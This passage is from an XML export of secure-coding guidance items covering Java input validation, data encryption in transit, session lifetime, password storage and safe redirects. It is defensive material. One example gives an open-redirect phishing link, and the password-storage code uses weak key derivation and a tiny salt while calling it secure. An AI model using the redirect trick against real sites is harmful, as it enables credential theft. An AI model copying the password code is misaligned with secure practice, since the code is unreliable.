&lt;pre&gt;public void doGet(HttpServletRequest request,&lt;br&gt;     HttpServletResponse response) throws ServletException, IOException{&lt;br&gt;     PrintWriter out = response.getWriter();&lt;br&gt;     String query = request.getParameter(&amp;quot;query&amp;quot;);&lt;br&gt;     String retData = &amp;quot;&amp;quot;;&lt;br&gt; &lt;br&gt;     // The application validates the user-supplied query&lt;br&gt;     // before submitting it to the database server&lt;br&gt;     if (validateQuery(query))&lt;br&gt;     {&lt;br&gt;          retData = queryDB(query);&lt;br&gt; &lt;br&gt;          ...&lt;br&gt; &lt;br&gt;     }&lt;br&gt; &lt;br&gt;     out.flush();&lt;br&gt;     out.close();&lt;br&gt;}&lt;br&gt; &lt;br&gt; &lt;br&gt;public boolean validateQuery(String input){&lt;br&gt; &lt;br&gt;      // The input can be only of numeric characters&lt;br&gt;      String goodPattern = &amp;quot;[0-9]&amp;#43;&amp;#43;&amp;quot;;&lt;br&gt; &lt;br&gt;      Pattern p = Pattern.compile(goodPattern);&lt;br&gt;      Matcher m = p.matcher(input);&lt;br&gt; &lt;br&gt;      if(!m.matches())&lt;br&gt;      {&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt; &lt;br&gt;      return true;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;A tutorial on regular expressions is available at &lt;a href="http://www.regular-expressions.info/"&gt;
Regular-Expressions.info&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information on using regular expression in Java, see: Documentation for
&lt;a href="http://download.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html"&gt;
Class Pattern&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:65482066-7D67-44BD-B959-D962D527A89B"&gt;Checklist Item: All Database Input is Validated (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9DF701E2-7929-4533-9DC3-368AAC4E553D"&gt;Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662"&gt;Guideline: Use Stored Procedures (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;Guideline: Validate Input from All Sources (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D47CF578-0D27-4F11-B594-C508E50982B5"&gt;Checklist Item: All Data Passed Between Native and Java Code is Validated (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>52a195b8-bc65-413c-8308-31649d8fb60b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt the Data or Secure the Communication Channel</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Sensitive Data</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Application&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;When passing sensitive data over the network, check that the data is either encrypted by the application or that the data is only passed over encrypted communication links.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Sensitive data passed across the network to and from the database server may include application specific data or database login credentials. To ensure the privacy and integrity of data over the network, either use a platform-level solution (such as that
 provided by a secure datacenter where IPSec encrypted communication channels are used between servers) or configure your application to establish SSL connections to the database.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;When you pass sensitive data over the network, make sure it remains private and unaltered.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;If you are sending sensitive data over the network to the client, encrypt the data or secure the channel. A common practice is to use SSL between the client and Web server. Between servers, an increasingly common approach is to use IPSec. For securing sensitive
 data that flows through several intermediaries, for example, Web service Simple Object Access Protocol (SOAP) messages, use message level encryption.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Design Guidelines for Secure Web Applications &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Architecture and Design Review for Security &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Security Question List: ASP.NET 2.0 &lt;a href="http://msdn2.microsoft.com/en-us/library/ms998375.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/ms998375.aspx&amp;nbsp;&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>539222c3-efd5-4387-b4e7-b24f9f461ba6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Limit Session Lifetime</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Session Management</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Application&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Reduce the lifetime of sessions to mitigate the risk of session hijacking and replay attacks.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Even when using SSL, there's still&amp;nbsp;a risk of session hijacking and replay; there are lots of other out-of-band ways to steal session tokens.&amp;nbsp; The shorter the session timeout, however, the less time an attacker has to capture a session cookie and use it to
 access your application.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All applications should consider the length of their sessions carefully, and any application protecting any sensitive information should make it as short as possible.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;There are two pieces of information that need to be handled to limit the session lifetime.&amp;nbsp; The first is the actual session cookie and the second is the server side session state.&amp;nbsp; With most frameworks, each time the user takes an action on the site the
 timestamps on the session cookie&amp;nbsp;and the corresponding field in the server-side session state&amp;nbsp;are both reset to the current time.&amp;nbsp; If someone attempts to use an expired cookie, the timestamp in the server-side session state for that session is checked and
 the request is disallowed.&amp;nbsp; If the session is old enough that the server-side state has been deleted, it's denied immediately.&amp;nbsp; In web farms, the timestamp may be embedded in the cookie and cryptographically signed, freeing up servers from the need to keep
 a single explicit session-state table.&lt;/p&gt;
&lt;p&gt;Most web application frameworks will handle the details for you, so you'll only need to specify a simple timeout value.&amp;nbsp; In some situations, you'll be able to choose whether the session timer should reset after each action (an idle timer, the default) or
 if it should be a single fixed timer from the initial login (an absolute timer).&amp;nbsp; The latter is useful for fast transactions and especially security critical situations.&lt;/p&gt;
&lt;p&gt;For most situations, thirty minutes is the maximum that an idle session should be accepted.&amp;nbsp; For sites which handle sensitive information, ten minutes is more appropriate.&amp;nbsp; If you want to allow a user to browse a site and let sessions sit for long periods
 of time and retain a customized experience, you can seperate out the cookies that control site customization from those that control access to more sensitive information or functionality; the customization cookies can be persisted while the actual session
 is expired.&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;A web site uses the default (one hour) session time set by their web application framework.&amp;nbsp; When a user in an internet cafe forgets to log off, an attacker using the machine after them can browse to the site and use the old session to gain access to the
 victim's sensitive information.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;A web site locks down its session timeouts to ten minutes, overriding the default set by their web application framework.&amp;nbsp; When a user in an internet cafe forgets to log off, an attacker using the machine after them cannot browse to the site and use the
 old session to gain access to the victim's sensitive information, because the session has already expired.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information see, &amp;quot;Chapter 4 - Design Guidelines for Secure Web Applications&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&amp;nbsp;&amp;nbsp;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5785aae6-b3d7-47d7-ab4e-31be81f29caf</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Store Passwords Securely</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Store passwords in a secure fashion. Do not store in plain text or use an easy-to-crack encryption or obfuscation scheme.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Storing passwords in plaintext or using weak encryption can aid an attacker when stealing them. Compromised passwords may aid an attacker into accessing, modifying and deleting sensitive data.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;This guideline should be followed only if your application requires that you store passwords. This may be necessary if, for instance, your application must retrieve the original password at some point. Otherwise, follow the
&lt;a href="?#ruledisplay:9AE15BFD-0C19-4539-A77A-BB1ADF93CA9A"&gt;Do Not Store Passwords&lt;/a&gt; guideline.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps to store passwords securely:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose user-identifiable data. &lt;/strong&gt;User-identifiable data will be used to generate a secure key. This data should be tied to the user's account, and it should be different for every user. For example, a valid email address would fit into this
 category. If your application uses the email address approach, confirm that the address is real and verify that no&amp;nbsp;two users are sharing an email address.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Generate the&amp;nbsp;key. &lt;/strong&gt;Use the user-identifiable data and some random salt to generate the key. Because encryption key sizes need to be 256 bit, it is recommended to generate the key by hashing the user-identifiable data with some random salt.
 This technique makes it impossible for an attacker to obtain the encryption key&amp;nbsp;unless he also&amp;nbsp;obtains your application's random salt.&lt;br&gt;
&lt;br&gt;
Make sure that you securely clean-up all instances of the generated encryption key as it can help an attacker compromise the protected password if the key is exposed. Consult the
&lt;a href="?#ruledisplay:E5D7DA05-EB59-46C5-AF9F-BA1B32C783CE"&gt;Clear Sensitive Data from Memory when No Longer Used&lt;/a&gt; guideline for more details. Example of generating an encryption key:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;byte[] salt = MyApp.generateSalt();&lt;br&gt;String userMail = &lt;a href="mailto:myapp@example.com"&gt;myapp@example.com&lt;/a&gt;;&lt;br&gt;MessageDigest md = MessageDigest.getInstance(&amp;quot;SHA-512&amp;quot;);&lt;br&gt;md.update(userMail.getBytes(&amp;quot;UTF-8&amp;quot;));&lt;br&gt;md.update(salt);&lt;br&gt;byte[] rawKey = md.digest();&lt;br&gt;md.reset();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;If your application uses a randomly generated salt, make sure that your application encrypts the random salt and stores it into a configuration file. Always use
&lt;strong&gt;SecureRandom&lt;/strong&gt; and not &lt;strong&gt;Random&lt;/strong&gt; to generate the salt. Example of using
&lt;strong&gt;SecureRandom&lt;/strong&gt; to generate a random salt:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public static byte[] generateSalt() throws NoSuchAlgorithmException&lt;br&gt;{&lt;br&gt;      // Note that salt is declared as private static byte[] and is&lt;br&gt;      // initialized to null.&lt;br&gt;       if (salt == null)&lt;br&gt;      {&lt;br&gt;            SecureRandom srand = SecureRandom.getInstance(&amp;quot;SHA1PRNG&amp;quot;);&lt;br&gt;                          salt = new byte[4];&lt;br&gt;            srand.nextBytes(salt);&lt;br&gt;      }&lt;br&gt;       return salt;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;For more information, consult the documentation for &lt;a href="http://java.sun.com/j2se/1.4.2/docs/api/java/security/SecureRandom.html"&gt;
SecureRandom Class&lt;/a&gt; in the Java SDK.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose an&amp;nbsp;appropriate encryption function. &lt;/strong&gt;Choose a strong symmetric encryption algorithm that will not be easy for an attacker to break such as AES.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;byte[] salt = MyApp.generateSalt();&lt;br&gt;String userMail = &lt;a href="mailto:myapp@example.com"&gt;myapp@example.com&lt;/a&gt;;&lt;br&gt;MessageDigest md = MessageDigest.getInstance(&amp;quot;SHA-512&amp;quot;);&lt;br&gt;md.update(userMail.getBytes(&amp;quot;UTF-8&amp;quot;));&lt;br&gt;md.update(salt);&lt;br&gt;byte[] rawKey = md.digest();&lt;br&gt;md.reset();&lt;br&gt;SecretKeySpec skeySpec = new SecretKeySpec(rawKey, &amp;quot;AES&amp;quot;);&lt;br&gt;// Set up cipherCipher cipher = Cipher.getInstance(&amp;quot;AES&amp;quot;);&lt;br&gt;cipher.init(Cipher.ENCRYPT_MODE, skeySpec);&lt;br&gt;// Note that pass is declared as byte[] and contains the user's password&lt;br&gt;byte[] encrypted = cipher.doFinal(pass);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Because of import control restrictions, Java initially ships with a limited set of cryptography. To fully utilize Java's crypto strength, it is recommended to install the &amp;quot;Unlimited Strength&amp;quot;
&lt;a href="http://java.sun.com/products/jce/index-14.html"&gt;Jurisdiction Policy Files&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Never store the user credentials or their encrypted values on the client side (e.g. in cookies, hidden fields, etc.). Use sessions when there is a need to track the user or to&amp;nbsp;store their encrypted credentials. For more information,
 consult the Session Management section.&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code authenticates a user based on a username and password. The supplied credentials are compared to the credentials stored in the backend database. Unfortunately, the credentials in the database are in plaintext and could be stolen if the
 database is compromised.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;      // Query the credential store with the provided credentials&lt;br&gt;      ...&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code validates the user based on a&amp;nbsp;given username and password. It uses the user's valid email address and a random salt to encrypt the user's password. Then it compares the username and the produced digest against the data stored in the backend
 database. Therefore, the password is stored encrypted in the database.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;       ...&lt;br&gt;       // Encrypt the credentials&lt;br&gt;      try&lt;br&gt;      {&lt;br&gt;            userEmail = MyApp.getEmailForUser(user);&lt;br&gt;            passDigest = encryptCredentials(userEmail, pass, salt);&lt;br&gt;      }&lt;br&gt;      catch (GeneralSecurityException gse)&lt;br&gt;      {&lt;br&gt;            // Add the appropriate logging and exception handling mechanisms&lt;br&gt;             &lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;      catch (IOException ioe)&lt;br&gt;      {&lt;br&gt;            // Add the appropriate logging and exception handling mechanisms&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;       // Query the credential store and execute the rest of the authentication steps&lt;br&gt;      ...&lt;br&gt;}&lt;br&gt;public static byte[] encryptCredentials(String email, char[] pass, byte[] salt)&lt;br&gt;       throws GeneralSecurityException, IOException&lt;br&gt;{&lt;br&gt;      MessageDigest md;&lt;br&gt;      byte[] tempPass;&lt;br&gt;      byte[] rawKey;&lt;br&gt;      // Generate encryption key&lt;br&gt;      md = MessageDigest.getInstance(&amp;quot;SHA-512&amp;quot;);&lt;br&gt;      md.update(email.getBytes(&amp;quot;UTF-8&amp;quot;));&lt;br&gt;      md.update(salt);&lt;br&gt;      rawKey = md.digest();&lt;br&gt;      md.reset();&lt;br&gt;      SecretKeySpec skeySpec = new SecretKeySpec(rawKey, &amp;quot;AES&amp;quot;);&lt;br&gt;      // Set up cipher&lt;br&gt;      Cipher cipher = Cipher.getInstance(&amp;quot;AES&amp;quot;);&lt;br&gt;      cipher.init(Cipher.ENCRYPT_MODE, skeySpec);&lt;br&gt;      // Convert char[] to byte[]&lt;br&gt;      tempPass = new byte[pass.length];&lt;br&gt;      for (int i = 0; i &amp;lt; pass.length; i&amp;#43;&amp;#43;)&lt;br&gt;      {&lt;br&gt;            tempPass[i] = (byte)pass[i];&lt;br&gt;      }&lt;br&gt;      // Encrypt password&lt;br&gt;      byte[] encrypted = cipher.doFinal(tempPass);&lt;br&gt;            //Clean tempPass&lt;br&gt;      for (int i = 0; i &amp;lt; tempPass.length; i&amp;#43;&amp;#43;)&lt;br&gt;      {&lt;br&gt;            tempPass[i] = 0;&lt;br&gt;      }&lt;br&gt;      return encrypted;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about the JCE API, see: &lt;a href="http://download.oracle.com/javase/1.4.2/docs/guide/security/jce/JCERefGuide.html"&gt;
Java Cryptography Extension for the Java 2 SDK, v 1.4&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about securely generating random numbers, see: Documentation for
&lt;a href="http://download.oracle.com/javase/1.4.2/docs/api/java/security/SecureRandom.html"&gt;
Class SecureRandom&lt;/a&gt; in Java SDK.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:9AE15BFD-0C19-4539-A77A-BB1ADF93CA9A"&gt;Guideline: Do Not Store Passwords (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:E5D7DA05-EB59-46C5-AF9F-BA1B32C783CE"&gt;Guideline: Clear Sensitive Data from Memory when No Longer Used (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8EDBAC9F-BFCF-43DF-A4FA-5BB7E03E7410"&gt;Guideline: Do Not Leave Passwords in Memory (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB"&gt;Attack: Chosen Ciphertext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD"&gt;Attack: Chosen Plaintext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:44E50CB3-9B24-4BC3-8CBA-73112F3C11BF"&gt;Checklist Item: Passwords are Stored Securely (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5b417ec2-f4d9-4571-82f1-813611cca26a</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Sensitive Data Over the Wire</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Sensitive Data</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Consider where items of sensitive data, such as credentials and application-specific data, are transmitted over a network link. Use a protocol that boasts adequate/strong encryption to protect said data.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;The internet is full of abstractions and layers. When data is sent over a wire, it typically passes through several intermediate relays on it's way towards&amp;nbsp;some final destination. Using a safe protocol to transmit information is important because it adds
 protection against inadvertent eavesdropping and modification in mid transport. &lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;This is appropriate whenever sensitive data needs to be sent between two hosts, whether it is using the public internet or a private LAN as a transmission medium.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;If you need to send sensitive data between the Web server and browser, consider using SSL. If you need to protect server-to-server communication, such as between your Web server and database, consider IPSec or SSL.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:a11d8cb9-767c-4307-8a53-4d0f61cc12fa"&gt;Sensitive Data is Not Stored in Cookies, Hidden Form Fields, or Query Strings&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5c75910d-7463-4da7-837d-916185d5dc43</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use Mapping Values When Redirecting on User Input</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use mapping values to perform redirects or forwards based on user input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using mapping values when performing redirects or forwards prevents malicious users from creating hyperlinks that use the redirects or forwards to point to pages other than those intended by the application design.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Use this guideline when writing a web application that uses redirects or forwards. Avoid using redirects or forwards in web applications, if possible.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Perform the following actions to calculate destinations of redirects and forwards based on mapping values:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify redirects and forwards.&lt;/strong&gt; Review code to find all redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enumerate destinations.&lt;/strong&gt; Make a list of all destinations pointed to by redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Define mapping values.&lt;/strong&gt; Define mapping values for all destinations used by redirects and forwards. A mapping value is a short identifying string that symbolically represents a resource.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rewrite redirects and forwards.&lt;/strong&gt; Rewrite redirects and forwards to use mapping values as input to calculate the final destinations of redirects or forwards.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider an on-line banking application that has an insecure redirect:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=[destination]&lt;/pre&gt;
&lt;p&gt;A phisher may create the following hyperlink to point to his own site and send it in spam messages to millions of people:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=www.phisher.com&lt;/pre&gt;
&lt;p&gt;When a user sees a link that appears to point to his bank at onlinebank.com in an e-mail message, he clicks that link and sees a web site that looks exactly like the bank's, but is actually a phishing web site used to steal authentication credentials. The
 user enters his account number and PIN into the web page, receives an error message telling him to try again, and is redirected to the bank's real site. After entering his credentials again, the user successfuly views his account. However, the phisher now
 has the user's online banking information.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The simplest solution&amp;nbsp;is to get rid of the redirect altogether, but if it is necessary for application design, then mapping values may be used to mitigate this vulnerability. For example, if redirect.asp is used by the application to redirect to balance.asp,
 a mapping value called &amp;quot;balance&amp;quot; may be created to signify balance.asp. The page redirect.asp should then be rewritten to accept mapping values as input, instead of urls. The following url should then redirect to balance.asp:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?map=balance&lt;/pre&gt;
&lt;p&gt;However, the following malicious hyperlink will no longer work, because supplied input will not match any mapping value defined in the application:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=www.phisher.com&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about unvalidated redirects and forwards, please see &lt;a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards"&gt;
http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:c2f99851-794e-4cda-a1ee-71447d93bfc8"&gt;Don't Use Redirects or Forwards if Possible&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33"&gt;Validate Destinations of Redirects and Forwards&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7"&gt;URL Redirection Attack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608"&gt;How to Test for URL Redirection Bugs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178"&gt;Phishing Attack&lt;br&gt;
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5d671ebe-781c-4de8-b1ef-f8e69fd13f73</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
